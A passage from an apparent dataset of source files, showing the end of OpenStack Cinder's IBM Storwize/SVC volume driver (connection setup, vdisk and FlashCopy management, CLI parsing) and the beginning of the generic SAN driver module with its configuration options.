                raise exception.VolumeBackendAPIException(data=exception_msg)

        try:
            # Get preferred node and other nodes in I/O group
            preferred_node_entry = None
            io_group_nodes = []
            for k, node in self._storage_nodes.iteritems():
                if vol_opts['protocol'] not in node['enabled_protocols']:
                    continue
                if node['id'] == preferred_node:
                    preferred_node_entry = node
                if node['IO_group'] == IO_group:
                    io_group_nodes.append(node)

            if not len(io_group_nodes):
                exception_msg = (_('initialize_connection: No node found in '
                                   'I/O group %(gid)s for volume %(vol)s') %
                                 {'gid': IO_group, 'vol': volume_name})
                raise exception.VolumeBackendAPIException(data=exception_msg)

            if not preferred_node_entry and not vol_opts['multipath']:
                # Get 1st node in I/O group
                preferred_node_entry = io_group_nodes[0]
                LOG.warn(_('initialize_connection: Did not find a preferred '
                           'node for volume %s') % volume_name)

            properties = {}
            properties['target_discovered'] = False
            properties['target_lun'] = lun_id
            properties['volume_id'] = volume['id']
            if vol_opts['protocol'] == 'iSCSI':
                type_str = 'iscsi'
                # We take the first IP address for now. Ideally, OpenStack will
                # support iSCSI multipath for improved performance.
                if len(preferred_node_entry['ipv4']):
                    ipaddr = preferred_node_entry['ipv4'][0]
                else:
                    ipaddr = preferred_node_entry['ipv6'][0]
                properties['target_portal'] = '%s:%s' % (ipaddr, '3260')
                properties['target_iqn'] = preferred_node_entry['iscsi_name']
                properties['auth_method'] = 'CHAP'
                properties['auth_username'] = connector['initiator']
                properties['auth_password'] = chap_secret
            else:
                type_str = 'fibre_channel'
                conn_wwpns = self._get_conn_fc_wwpns(host_name)
                if not vol_opts['multipath']:
                    if preferred_node_entry['WWPN'] in conn_wwpns:
                        properties['target_wwn'] = preferred_node_entry['WWPN']
                    else:
                        properties['target_wwn'] = conn_wwpns[0]
                else:
                    properties['target_wwn'] = conn_wwpns
        except Exception:
            with excutils.save_and_reraise_exception():
                self.terminate_connection(volume, connector)
                LOG.error(_('initialize_connection: Failed to collect return '
                            'properties for volume %(vol)s and connector '
                            '%(conn)s.\n') % {'vol': str(volume),
                                              'conn': str(connector)})

        LOG.debug(_('leave: initialize_connection:\n volume: %(vol)s\n '
                    'connector %(conn)s\n properties: %(prop)s')
                  % {'vol': str(volume),
                     'conn': str(connector),
                     'prop': str(properties)})

        return {'driver_volume_type': type_str, 'data': properties, }

    def terminate_connection(self, volume, connector, **kwargs):
        """"""Cleanup after an iSCSI connection has been terminated.

        When we clean up a terminated connection between a given connector
        and volume, we:
        1. Translate the given connector to a host name
        2. Remove the volume-to-host mapping if it exists
        3. Delete the host if it has no more mappings (hosts are created
           automatically by this driver when mappings are created)
        """"""
        LOG.debug(_('enter: terminate_connection: volume %(vol)s with '
                    'connector %(conn)s') % {'vol': str(volume),
                                             'conn': str(connector)})

        vol_name = volume['name']
        host_name = self._get_host_from_connector(connector)
        # Verify that _get_host_from_connector returned the host.
        # This should always succeed as we terminate an existing connection.
        self._driver_assert(
            host_name is not None,
            _('_get_host_from_connector failed to return the host name '
              'for connector'))

        # Check if vdisk-host mapping exists, remove if it does
        mapping_data = self._get_hostvdisk_mappings(host_name)
        if vol_name in mapping_data:
            ssh_cmd = ['svctask', 'rmvdiskhostmap', '-host', host_name,
                       vol_name]
            out, err = self._run_ssh(ssh_cmd)
            # Verify CLI behaviour - no output is returned from
            # rmvdiskhostmap
            self._assert_ssh_return(len(out.strip()) == 0,
                                    'terminate_connection', ssh_cmd, out, err)
            del mapping_data[vol_name]
        else:
            LOG.error(_('terminate_connection: No mapping of volume '
                        '%(vol_name)s to host %(host_name)s found') %
                      {'vol_name': vol_name, 'host_name': host_name})

        # If this host has no more mappings, delete it
        if not mapping_data:
            self._delete_host(host_name)

        LOG.debug(_('leave: terminate_connection: volume %(vol)s with '
                    'connector %(conn)s') % {'vol': str(volume),
                                             'conn': str(connector)})

    """"""=====================================================================""""""
    """""" VOLUMES/SNAPSHOTS                                                   """"""
    """"""=====================================================================""""""

    def _get_vdisk_attributes(self, vdisk_name):
        """"""Return vdisk attributes, or None if vdisk does not exist

        Exception is raised if the information from system can not be
        parsed/matched to a single vdisk.
        """"""

        ssh_cmd = ['svcinfo', 'lsvdisk', '-bytes', '-delim', '!', vdisk_name]
        return self._execute_command_and_parse_attributes(ssh_cmd)

    def _get_vdisk_fc_mappings(self, vdisk_name):
        """"""Return FlashCopy mappings that this vdisk is associated with.""""""

        ssh_cmd = ['svcinfo', 'lsvdiskfcmappings', '-nohdr', vdisk_name]
        out, err = self._run_ssh(ssh_cmd)

        mapping_ids = []
        if (len(out.strip())):
            lines = out.strip().split('\n')
            mapping_ids = [line.split()[0] for line in lines]
        return mapping_ids

    def _get_vdisk_params(self, type_id):
        opts = self._build_default_opts()
        if type_id:
            ctxt = context.get_admin_context()
            volume_type = volume_types.get_volume_type(ctxt, type_id)
            specs = volume_type.get('extra_specs')
            for k, value in specs.iteritems():
                # Get the scope, if using scope format
                key_split = k.split(':')
                if len(key_split) == 1:
                    scope = None
                    key = key_split[0]
                else:
                    scope = key_split[0]
                    key = key_split[1]

                # We generally do not look at capabilities in the driver, but
                # protocol is a special case where the user asks for a given
                # protocol and we want both the scheduler and the driver to act
                # on the value.
                if scope == 'capabilities' and key == 'storage_protocol':
                    scope = None
                    key = 'protocol'
                    words = value.split()
                    self._driver_assert(words and
                                        len(words) == 2 and
                                        words[0] == '<in>',
                                        _('protocol must be specified as '
                                          '\'<in> iSCSI\' or \'<in> FC\''))
                    del words[0]
                    value = words[0]

                # Anything keys that the driver should look at should have the
                # 'drivers' scope.
                if scope and scope != ""drivers"":
                    continue

                if key in opts:
                    this_type = type(opts[key]).__name__
                    if this_type == 'int':
                        value = int(value)
                    elif this_type == 'bool':
                        value = strutils.bool_from_string(value)
                    opts[key] = value

        self._check_vdisk_opts(opts)
        return opts

    def _create_vdisk(self, name, size, units, opts):
        """"""Create a new vdisk.""""""

        LOG.debug(_('enter: _create_vdisk: vdisk %s ') % name)

        model_update = None
        easytier = 'on' if opts['easytier'] else 'off'

        # Set space-efficient options
        if opts['rsize'] == -1:
            ssh_cmd_se_opt = []
        else:
            ssh_cmd_se_opt = ['-rsize', '%s%%' % str(opts['rsize']),
                              '-autoexpand', '-warning',
                              '%s%%' % str(opts['warning'])]
            if not opts['autoexpand']:
                ssh_cmd_se_opt.remove('-autoexpand')

            if opts['compression']:
                ssh_cmd_se_opt.append('-compressed')
            else:
                ssh_cmd_se_opt.extend(['-grainsize', str(opts['grainsize'])])

        ssh_cmd = ['svctask', 'mkvdisk', '-name', name, '-mdiskgrp',
                   self.configuration.storwize_svc_volpool_name,
                   '-iogrp', '0', '-size', size, '-unit',
                   units, '-easytier', easytier] + ssh_cmd_se_opt
        out, err = self._run_ssh(ssh_cmd)
        self._assert_ssh_return(len(out.strip()), '_create_vdisk',
                                ssh_cmd, out, err)

        # Ensure that the output is as expected
        match_obj = re.search('Virtual Disk, id \[([0-9]+)\], '
                              'successfully created', out)
        # Make sure we got a ""successfully created"" message with vdisk id
        self._driver_assert(
            match_obj is not None,
            _('_create_vdisk %(name)s - did not find '
              'success message in CLI output.\n '
              'stdout: %(out)s\n stderr: %(err)s')
            % {'name': name, 'out': str(out), 'err': str(err)})

        LOG.debug(_('leave: _create_vdisk: volume %s ') % name)

    def _make_fc_map(self, source, target, full_copy):
        fc_map_cli_cmd = ['svctask', 'mkfcmap', '-source', source, '-target',
                          target, '-autodelete']
        if not full_copy:
            fc_map_cli_cmd.extend(['-copyrate', '0'])
        out, err = self._run_ssh(fc_map_cli_cmd)
        self._driver_assert(
            len(out.strip()),
            _('create FC mapping from %(source)s to %(target)s - '
              'did not find success message in CLI output.\n'
              ' stdout: %(out)s\n stderr: %(err)s\n')
            % {'source': source,
               'target': target,
               'out': str(out),
               'err': str(err)})

        # Ensure that the output is as expected
        match_obj = re.search('FlashCopy Mapping, id \[([0-9]+)\], '
                              'successfully created', out)
        # Make sure we got a ""successfully created"" message with vdisk id
        self._driver_assert(
            match_obj is not None,
            _('create FC mapping from %(source)s to %(target)s - '
              'did not find success message in CLI output.\n'
              ' stdout: %(out)s\n stderr: %(err)s\n')
            % {'source': source,
               'target': target,
               'out': str(out),
               'err': str(err)})

        try:
            fc_map_id = match_obj.group(1)
            self._driver_assert(
                fc_map_id is not None,
                _('create FC mapping from %(source)s to %(target)s - '
                  'did not find mapping id in CLI output.\n'
                  ' stdout: %(out)s\n stderr: %(err)s\n')
                % {'source': source,
                   'target': target,
                   'out': str(out),
                   'err': str(err)})
        except IndexError:
            self._driver_assert(
                False,
                _('create FC mapping from %(source)s to %(target)s - '
                  'did not find mapping id in CLI output.\n'
                  ' stdout: %(out)s\n stderr: %(err)s\n')
                % {'source': source,
                   'target': target,
                   'out': str(out),
                   'err': str(err)})
        return fc_map_id

    def _call_prepare_fc_map(self, fc_map_id, source, target):
        try:
            out, err = self._run_ssh(['svctask', 'prestartfcmap', fc_map_id])
        except exception.ProcessExecutionError as e:
            with excutils.save_and_reraise_exception():
                LOG.error(_('_prepare_fc_map: Failed to prepare FlashCopy '
                            'from %(source)s to %(target)s.\n'
                            'stdout: %(out)s\n stderr: %(err)s')
                          % {'source': source,
                             'target': target,
                             'out': e.stdout,
                             'err': e.stderr})

    def _prepare_fc_map(self, fc_map_id, source, target):
        self._call_prepare_fc_map(fc_map_id, source, target)
        mapping_ready = False
        wait_time = 5
        # Allow waiting of up to timeout (set as parameter)
        timeout = self.configuration.storwize_svc_flashcopy_timeout
        max_retries = (timeout / wait_time) + 1
        for try_number in range(1, max_retries):
            mapping_attrs = self._get_flashcopy_mapping_attributes(fc_map_id)
            if (mapping_attrs is None or
                    'status' not in mapping_attrs):
                break
            if mapping_attrs['status'] == 'prepared':
                mapping_ready = True
                break
            elif mapping_attrs['status'] == 'stopped':
                self._call_prepare_fc_map(fc_map_id, source, target)
            elif mapping_attrs['status'] != 'preparing':
                # Unexpected mapping status
                exception_msg = (_('Unexecpted mapping status %(status)s '
                                   'for mapping %(id)s. Attributes: '
                                   '%(attr)s')
                                 % {'status': mapping_attrs['status'],
                                    'id': fc_map_id,
                                    'attr': mapping_attrs})
                raise exception.VolumeBackendAPIException(data=exception_msg)
            # Need to wait for mapping to be prepared, wait a few seconds
            time.sleep(wait_time)

        if not mapping_ready:
            exception_msg = (_('Mapping %(id)s prepare failed to complete '
                               'within the allotted %(to)d seconds timeout. '
                               'Terminating.')
                             % {'id': fc_map_id,
                                'to': timeout})
            LOG.error(_('_prepare_fc_map: Failed to start FlashCopy '
                        'from %(source)s to %(target)s with '
                        'exception %(ex)s')
                      % {'source': source,
                         'target': target,
                         'ex': exception_msg})
            raise exception.InvalidSnapshot(
                reason=_('_prepare_fc_map: %s') % exception_msg)

    def _start_fc_map(self, fc_map_id, source, target):
        try:
            out, err = self._run_ssh(['svctask', 'startfcmap', fc_map_id])
        except exception.ProcessExecutionError as e:
            with excutils.save_and_reraise_exception():
                LOG.error(_('_start_fc_map: Failed to start FlashCopy '
                            'from %(source)s to %(target)s.\n'
                            'stdout: %(out)s\n stderr: %(err)s')
                          % {'source': source,
                             'target': target,
                             'out': e.stdout,
                             'err': e.stderr})

    def _run_flashcopy(self, source, target, full_copy=True):
        """"""Create a FlashCopy mapping from the source to the target.""""""

        LOG.debug(_('enter: _run_flashcopy: execute FlashCopy from source '
                    '%(source)s to target %(target)s') %
                  {'source': source, 'target': target})

        fc_map_id = self._make_fc_map(source, target, full_copy)
        try:
            self._prepare_fc_map(fc_map_id, source, target)
            self._start_fc_map(fc_map_id, source, target)
        except Exception:
            with excutils.save_and_reraise_exception():
                self._delete_vdisk(target, True)

        LOG.debug(_('leave: _run_flashcopy: FlashCopy started from '
                    '%(source)s to %(target)s') %
                  {'source': source, 'target': target})

    def _create_copy(self, src_vdisk, tgt_vdisk, full_copy, opts, src_id,
                     from_vol):
        """"""Create a new snapshot using FlashCopy.""""""

        LOG.debug(_('enter: _create_copy: snapshot %(tgt_vdisk)s from '
                    'vdisk %(src_vdisk)s') %
                  {'tgt_vdisk': tgt_vdisk, 'src_vdisk': src_vdisk})

        src_vdisk_attributes = self._get_vdisk_attributes(src_vdisk)
        if src_vdisk_attributes is None:
            exception_msg = (
                _('_create_copy: Source vdisk %s does not exist')
                % src_vdisk)
            LOG.error(exception_msg)
            if from_vol:
                raise exception.VolumeNotFound(exception_msg,
                                               volume_id=src_id)
            else:
                raise exception.SnapshotNotFound(exception_msg,
                                                 snapshot_id=src_id)

        self._driver_assert(
            'capacity' in src_vdisk_attributes,
            _('_create_copy: cannot get source vdisk '
              '%(src)s capacity from vdisk attributes '
              '%(attr)s')
            % {'src': src_vdisk,
               'attr': src_vdisk_attributes})

        src_vdisk_size = src_vdisk_attributes['capacity']
        self._create_vdisk(tgt_vdisk, src_vdisk_size, 'b', opts)
        self._run_flashcopy(src_vdisk, tgt_vdisk, full_copy)

        LOG.debug(_('leave: _create_copy: snapshot %(tgt_vdisk)s from '
                    'vdisk %(src_vdisk)s') %
                  {'tgt_vdisk': tgt_vdisk, 'src_vdisk': src_vdisk})

    def _get_flashcopy_mapping_attributes(self, fc_map_id):
        LOG.debug(_('enter: _get_flashcopy_mapping_attributes: mapping %s')
                  % fc_map_id)

        fc_ls_map_cmd = ['svcinfo', 'lsfcmap', '-filtervalue',
                         'id=%s' % fc_map_id, '-delim', '!']
        out, err = self._run_ssh(fc_ls_map_cmd)
        if not len(out.strip()):
            return None

        # Get list of FlashCopy mappings
        # We expect zero or one line if mapping does not exist,
        # two lines if it does exist, otherwise error
        lines = out.strip().split('\n')
        self._assert_ssh_return(len(lines) <= 2,
                                '_get_flashcopy_mapping_attributes',
                                fc_ls_map_cmd, out, err)

        if len(lines) == 2:
            attributes = self._get_hdr_dic(lines[0], lines[1], '!')
        else:  # 0 or 1 lines
            attributes = None

        LOG.debug(_('leave: _get_flashcopy_mapping_attributes: mapping '
                    '%(fc_map_id)s, attributes %(attributes)s') %
                  {'fc_map_id': fc_map_id, 'attributes': attributes})

        return attributes

    def _is_vdisk_defined(self, vdisk_name):
        """"""Check if vdisk is defined.""""""
        LOG.debug(_('enter: _is_vdisk_defined: vdisk %s ') % vdisk_name)
        vdisk_attributes = self._get_vdisk_attributes(vdisk_name)
        LOG.debug(_('leave: _is_vdisk_defined: vdisk %(vol)s with %(str)s ')
                  % {'vol': vdisk_name,
                     'str': vdisk_attributes is not None})
        if vdisk_attributes is None:
            return False
        else:
            return True

    def _ensure_vdisk_no_fc_mappings(self, name, allow_snaps=True):
        # Ensure vdisk has no FlashCopy mappings
        mapping_ids = self._get_vdisk_fc_mappings(name)
        while len(mapping_ids):
            wait_for_copy = False
            for map_id in mapping_ids:
                attrs = self._get_flashcopy_mapping_attributes(map_id)
                if not attrs:
                    continue
                source = attrs['source_vdisk_name']
                target = attrs['target_vdisk_name']
                copy_rate = attrs['copy_rate']
                status = attrs['status']

                if copy_rate == '0':
                    # Case #2: A vdisk that has snapshots
                    if source == name:
                        if not allow_snaps:
                            return False
                        ssh_cmd = ['svctask', 'chfcmap', '-copyrate', '50',
                                   '-autodelete', 'on', map_id]
                        out, err = self._run_ssh(ssh_cmd)
                        wait_for_copy = True
                    # Case #3: A snapshot
                    else:
                        msg = (_('Vdisk %(name)s not involved in '
                                 'mapping %(src)s -> %(tgt)s') %
                               {'name': name, 'src': source, 'tgt': target})
                        self._driver_assert(target == name, msg)
                        if status in ['copying', 'prepared']:
                            self._run_ssh(['svctask', 'stopfcmap', map_id])
                        elif status in ['stopping', 'preparing']:
                            wait_for_copy = True
                        else:
                            self._run_ssh(['svctask', 'rmfcmap', '-force',
                                           map_id])
                # Case 4: Copy in progress - wait and will autodelete
                else:
                    if status == 'prepared':
                        self._run_ssh(['svctask', 'stopfcmap', map_id])
                        self._run_ssh(['svctask', 'rmfcmap', '-force', map_id])
                    elif status == 'idle_or_copied':
                        # Prepare failed
                        self._run_ssh(['svctask', 'rmfcmap', '-force', map_id])
                    else:
                        wait_for_copy = True
            if wait_for_copy:
                time.sleep(5)
            mapping_ids = self._get_vdisk_fc_mappings(name)
        return True

    def _delete_vdisk(self, name, force):
        """"""Deletes existing vdisks.

        It is very important to properly take care of mappings before deleting
        the disk:
        1. If no mappings, then it was a vdisk, and can be deleted
        2. If it is the source of a flashcopy mapping and copy_rate is 0, then
           it is a vdisk that has a snapshot.  If the force flag is set,
           delete the mapping and the vdisk, otherwise set the mapping to
           copy and wait (this will allow users to delete vdisks that have
           snapshots if/when the upper layers allow it).
        3. If it is the target of a mapping and copy_rate is 0, it is a
           snapshot, and we should properly stop the mapping and delete.
        4. If it is the source/target of a mapping and copy_rate is not 0, it
           is a clone or vdisk created from a snapshot.  We wait for the copy
           to complete (the mapping will be autodeleted) and then delete the
           vdisk.

        """"""

        LOG.debug(_('enter: _delete_vdisk: vdisk %s') % name)

        # Try to delete volume only if found on the storage
        vdisk_defined = self._is_vdisk_defined(name)
        if not vdisk_defined:
            LOG.info(_('warning: Tried to delete vdisk %s but it does not '
                       'exist.') % name)
            return

        self._ensure_vdisk_no_fc_mappings(name)

        ssh_cmd = ['svctask', 'rmvdisk', '-force', name]
        if not force:
            ssh_cmd.remove('-force')
        out, err = self._run_ssh(ssh_cmd)
        # No output should be returned from rmvdisk
        self._assert_ssh_return(len(out.strip()) == 0,
                                ('_delete_vdisk %(name)s')
                                % {'name': name},
                                ssh_cmd, out, err)
        LOG.debug(_('leave: _delete_vdisk: vdisk %s') % name)

    def create_volume(self, volume):
        opts = self._get_vdisk_params(volume['volume_type_id'])
        return self._create_vdisk(volume['name'], str(volume['size']), 'gb',
                                  opts)

    def delete_volume(self, volume):
        self._delete_vdisk(volume['name'], False)

    def create_snapshot(self, snapshot):
        source_vol = self.db.volume_get(self._context, snapshot['volume_id'])
        opts = self._get_vdisk_params(source_vol['volume_type_id'])
        self._create_copy(src_vdisk=snapshot['volume_name'],
                          tgt_vdisk=snapshot['name'],
                          full_copy=False,
                          opts=opts,
                          src_id=snapshot['volume_id'],
                          from_vol=True)

    def delete_snapshot(self, snapshot):
        self._delete_vdisk(snapshot['name'], False)

    def create_volume_from_snapshot(self, volume, snapshot):
        if volume['size'] != snapshot['volume_size']:
            exception_message = (_('create_volume_from_snapshot: '
                                   'Source and destination size differ.'))
            raise exception.VolumeBackendAPIException(data=exception_message)

        opts = self._get_vdisk_params(volume['volume_type_id'])
        self._create_copy(src_vdisk=snapshot['name'],
                          tgt_vdisk=volume['name'],
                          full_copy=True,
                          opts=opts,
                          src_id=snapshot['id'],
                          from_vol=False)

    def create_cloned_volume(self, tgt_volume, src_volume):
        if src_volume['size'] != tgt_volume['size']:
            exception_message = (_('create_cloned_volume: '
                                   'Source and destination size differ.'))
            raise exception.VolumeBackendAPIException(data=exception_message)

        opts = self._get_vdisk_params(tgt_volume['volume_type_id'])
        self._create_copy(src_vdisk=src_volume['name'],
                          tgt_vdisk=tgt_volume['name'],
                          full_copy=True,
                          opts=opts,
                          src_id=src_volume['id'],
                          from_vol=True)

    def extend_volume(self, volume, new_size):
        LOG.debug(_('enter: extend_volume: volume %s') % volume['id'])
        ret = self._ensure_vdisk_no_fc_mappings(volume['name'],
                                                allow_snaps=False)
        if not ret:
            exception_message = (_('extend_volume: Extending a volume with '
                                   'snapshots is not supported.'))
            raise exception.VolumeBackendAPIException(data=exception_message)

        extend_amt = int(new_size) - volume['size']
        ssh_cmd = (['svctask', 'expandvdisksize', '-size', str(extend_amt),
                    '-unit', 'gb', volume['name']])
        out, err = self._run_ssh(ssh_cmd)
        # No output should be returned from expandvdisksize
        self._assert_ssh_return(len(out.strip()) == 0, 'extend_volume',
                                ssh_cmd, out, err)
        LOG.debug(_('leave: extend_volume: volume %s') % volume['id'])

    """"""=====================================================================""""""
    """""" MISC/HELPERS                                                        """"""
    """"""=====================================================================""""""

    def get_volume_stats(self, refresh=False):
        """"""Get volume stats.

        If we haven't gotten stats yet or 'refresh' is True,
        run update the stats first.
        """"""
        if not self._stats or refresh:
            self._update_volume_stats()

        return self._stats

    def _update_volume_stats(self):
        """"""Retrieve stats info from volume group.""""""

        LOG.debug(_(""Updating volume stats""))
        data = {}

        data['vendor_name'] = 'IBM'
        data['driver_version'] = '1.1'
        data['storage_protocol'] = list(self._enabled_protocols)

        data['total_capacity_gb'] = 0  # To be overwritten
        data['free_capacity_gb'] = 0   # To be overwritten
        data['reserved_percentage'] = 0
        data['QoS_support'] = False

        pool = self.configuration.storwize_svc_volpool_name
        #Get storage system name
        ssh_cmd = ['svcinfo', 'lssystem', '-delim', '!']
        attributes = self._execute_command_and_parse_attributes(ssh_cmd)
        if not attributes or not attributes['name']:
            exception_message = (_('_update_volume_stats: '
                                   'Could not get system name'))
            raise exception.VolumeBackendAPIException(data=exception_message)

        backend_name = self.configuration.safe_get('volume_backend_name')
        if not backend_name:
            backend_name = '%s_%s' % (attributes['name'], pool)
        data['volume_backend_name'] = backend_name

        ssh_cmd = ['svcinfo', 'lsmdiskgrp', '-bytes', '-delim', '!', pool]
        attributes = self._execute_command_and_parse_attributes(ssh_cmd)
        if not attributes:
            LOG.error(_('Could not get pool data from the storage'))
            exception_message = (_('_update_volume_stats: '
                                   'Could not get storage pool data'))
            raise exception.VolumeBackendAPIException(data=exception_message)

        data['total_capacity_gb'] = (float(attributes['capacity']) /
                                    (1024 ** 3))
        data['free_capacity_gb'] = (float(attributes['free_capacity']) /
                                    (1024 ** 3))
        data['easytier_support'] = attributes['easy_tier'] in ['on', 'auto']
        data['compression_support'] = self._compression_enabled

        self._stats = data

    def _port_conf_generator(self, cmd):
        ssh_cmd = cmd + ['-delim', '!']
        out, err = self._run_ssh(ssh_cmd)

        if not len(out.strip()):
            return
        port_lines = out.strip().split('\n')
        if not len(port_lines):
            return

        header = port_lines.pop(0)
        yield header
        for portip_line in port_lines:
            try:
                port_data = self._get_hdr_dic(header, portip_line, '!')
            except exception.VolumeBackendAPIException:
                with excutils.save_and_reraise_exception():
                    self._log_cli_output_error('_port_conf_generator',
                                               ssh_cmd, out, err)
            yield port_data

    def _check_vdisk_opts(self, opts):
        # Check that rsize is either -1 or between 0 and 100
        if not (opts['rsize'] >= -1 and opts['rsize'] <= 100):
            raise exception.InvalidInput(
                reason=_('Illegal value specified for storwize_svc_vol_rsize: '
                         'set to either a percentage (0-100) or -1'))

        # Check that warning is either -1 or between 0 and 100
        if not (opts['warning'] >= -1 and opts['warning'] <= 100):
            raise exception.InvalidInput(
                reason=_('Illegal value specified for '
                         'storwize_svc_vol_warning: '
                         'set to a percentage (0-100)'))

        # Check that grainsize is 32/64/128/256
        if opts['grainsize'] not in [32, 64, 128, 256]:
            raise exception.InvalidInput(
                reason=_('Illegal value specified for '
                         'storwize_svc_vol_grainsize: set to either '
                         '32, 64, 128, or 256'))

        # Check that compression is supported
        if opts['compression'] and not self._compression_enabled:
            raise exception.InvalidInput(
                reason=_('System does not support compression'))

        # Check that rsize is set if compression is set
        if opts['compression'] and opts['rsize'] == -1:
            raise exception.InvalidInput(
                reason=_('If compression is set to True, rsize must '
                         'also be set (not equal to -1)'))

        # Check that the requested protocol is enabled
        if opts['protocol'] not in self._enabled_protocols:
            raise exception.InvalidInput(
                reason=_('Illegal value %(prot)s specified for '
                         'storwize_svc_connection_protocol: '
                         'valid values are %(enabled)s')
                % {'prot': opts['protocol'],
                   'enabled': ','.join(self._enabled_protocols)})

        # Check that multipath is only enabled for fc
        if opts['protocol'] != 'FC' and opts['multipath']:
            raise exception.InvalidInput(
                reason=_('Multipath is currently only supported for FC '
                         'connections and not iSCSI.  (This is a Nova '
                         'limitation.)'))

    def _execute_command_and_parse_attributes(self, ssh_cmd):
        """"""Execute command on the Storwize/SVC and parse attributes.

        Exception is raised if the information from the system
        can not be obtained.

        """"""

        LOG.debug(_('enter: _execute_command_and_parse_attributes: '
                    ' command %s') % str(ssh_cmd))

        try:
            out, err = self._run_ssh(ssh_cmd)
        except exception.ProcessExecutionError as e:
            # Didn't get details from the storage, return None
            LOG.error(_('CLI Exception output:\n command: %(cmd)s\n '
                        'stdout: %(out)s\n stderr: %(err)s') %
                      {'cmd': ssh_cmd,
                       'out': e.stdout,
                       'err': e.stderr})
            return None

        self._assert_ssh_return(len(out),
                                '_execute_command_and_parse_attributes',
                                ssh_cmd, out, err)
        attributes = {}
        for attrib_line in out.split('\n'):
            # If '!' not found, return the string and two empty strings
            attrib_name, foo, attrib_value = attrib_line.partition('!')
            if attrib_name is not None and len(attrib_name.strip()):
                attributes[attrib_name] = attrib_value

        LOG.debug(_('leave: _execute_command_and_parse_attributes:\n'
                    'command: %(cmd)s\n'
                    'attributes: %(attr)s')
                  % {'cmd': str(ssh_cmd),
                     'attr': str(attributes)})

        return attributes

    def _get_hdr_dic(self, header, row, delim):
        """"""Return CLI row data as a dictionary indexed by names from header.
        string. The strings are converted to columns using the delimiter in
        delim.
        """"""

        attributes = header.split(delim)
        values = row.split(delim)
        self._driver_assert(
            len(values) ==
            len(attributes),
            _('_get_hdr_dic: attribute headers and values do not match.\n '
              'Headers: %(header)s\n Values: %(row)s')
            % {'header': str(header),
               'row': str(row)})
        dic = dict((a, v) for a, v in map(None, attributes, values))
        return dic

    def _log_cli_output_error(self, function, cmd, out, err):
        LOG.error(_('%(fun)s: Failed with unexpected CLI output.\n '
                    'Command: %(cmd)s\nstdout: %(out)s\nstderr: %(err)s\n')
                  % {'fun': function, 'cmd': cmd,
                     'out': str(out), 'err': str(err)})

    def _driver_assert(self, assert_condition, exception_message):
        """"""Internal assertion mechanism for CLI output.""""""
        if not assert_condition:
            LOG.error(exception_message)
            raise exception.VolumeBackendAPIException(data=exception_message)

    def _assert_ssh_return(self, test, fun, ssh_cmd, out, err):
        self._driver_assert(
            test,
            _('%(fun)s: Failed with unexpected CLI output.\n '
              'Command: %(cmd)s\n stdout: %(out)s\n stderr: %(err)s')
            % {'fun': fun,
               'cmd': ssh_cmd,
               'out': str(out),
               'err': str(err)})

    def _handle_keyerror(self, function, header):
        msg = (_('Did not find expected column in %(fun)s: %(hdr)s') %
               {'fun': function, 'hdr': header})
        LOG.error(msg)
        raise exception.VolumeBackendAPIException(
            data=msg)


class CLIResponse(object):
    '''Parse SVC CLI output and generate iterable'''

    def __init__(self, raw, delim='!', with_header=True):
        super(CLIResponse, self).__init__()
        self.raw = raw
        self.delim = delim
        self.with_header = with_header
        self.result = self._parse()

    def select(self, *keys):
        for a in self.result:
            vs = []
            for k in keys:
                v = a.get(k, None)
                if isinstance(v, basestring):
                    v = [v]
                if isinstance(v, list):
                    vs.append(v)
            for item in zip(*vs):
                yield item

    def __getitem__(self, key):
        return self.result[key]

    def __iter__(self):
        for a in self.result:
            yield a

    def __len__(self):
        return len(self.result)

    def _parse(self):
        def get_reader(content, delim):
            for line in content.lstrip().splitlines():
                line = line.strip()
                if line:
                    yield line.split(delim)
                else:
                    yield []

        if isinstance(self.raw, basestring):
            stdout, stderr = self.raw, ''
        else:
            stdout, stderr = self.raw
        reader = get_reader(stdout, self.delim)
        result = []

        if self.with_header:
            hds = tuple()
            for row in reader:
                hds = row
                break
            for row in reader:
                cur = dict()
                for k, v in zip(hds, row):
                    CLIResponse.append_dict(cur, k, v)
                result.append(cur)
        else:
            cur = dict()
            for row in reader:
                if row:
                    CLIResponse.append_dict(cur, row[0], ' '.join(row[1:]))
                elif cur:  # start new section
                    result.append(cur)
                    cur = dict()
            if cur:
                result.append(cur)
        return result

    @staticmethod
    def append_dict(dict_, key, value):
        key, value = key.strip(), value.strip()
        obj = dict_.get(key, None)
        if obj is None:
            dict_[key] = value
        elif isinstance(obj, list):
            obj.append(value)
            dict_[key] = obj
        else:
            dict_[key] = [obj, value]
        return dict_
/n/n/n",0
75,75,f752302d181583a95cf44354aea607ce9d9283f4,"/cinder/volume/drivers/san/san.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4

# Copyright 2011 Justin Santa Barbara
# All Rights Reserved.
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
""""""
Default Driver for san-stored volumes.

The unique thing about a SAN is that we don't expect that we can run the volume
controller on the SAN hardware.  We expect to access it over SSH or some API.
""""""

import random

from eventlet import greenthread
from oslo.config import cfg

from cinder import exception
from cinder.openstack.common import excutils
from cinder.openstack.common import log as logging
from cinder import utils
from cinder.volume import driver

LOG = logging.getLogger(__name__)

san_opts = [
    cfg.BoolOpt('san_thin_provision',
                default=True,
                help='Use thin provisioning for SAN volumes?'),
    cfg.StrOpt('san_ip',
               default='',
               help='IP address of SAN controller'),
    cfg.StrOpt('san_login',
               default='admin',
               help='Username for SAN controller'),
    cfg.StrOpt('san_password',
               default='',
               help='Password for SAN controller',
               secret=True),
    cfg.StrOpt('san_private_key',
               default='',
               help='Filename of private key to use for SSH authentication'),
    cfg.StrOpt('san_clustername',
               default='',
               help='Cluster name to use for creating volumes'),
    cfg.IntOpt('san_ssh_port',
               default=22,
               help='SSH port to use with SAN'),
    cfg.BoolOpt('san_is_local',
                default=False,
                help='Execute commands locally instead of over SSH; '
                     'use if the volume service is running on the SAN device'),
    cfg.IntOpt('ssh_conn_timeout',
               default=30,
               help=""SSH connection timeout in seconds""),
    cfg.IntOpt('ssh_min_pool_conn',
               default=1,
               help='Minimum ssh connections in the pool'),
    cfg.IntOpt('ssh_max_pool_conn',
               default=5,
               help='Maximum ssh connections in the pool'),
]

CONF = cfg.CONF
CONF.register_opts(san_opts)


class SanDriver(driver.VolumeDriver):
    """"""Base class for SAN-style storage volumes

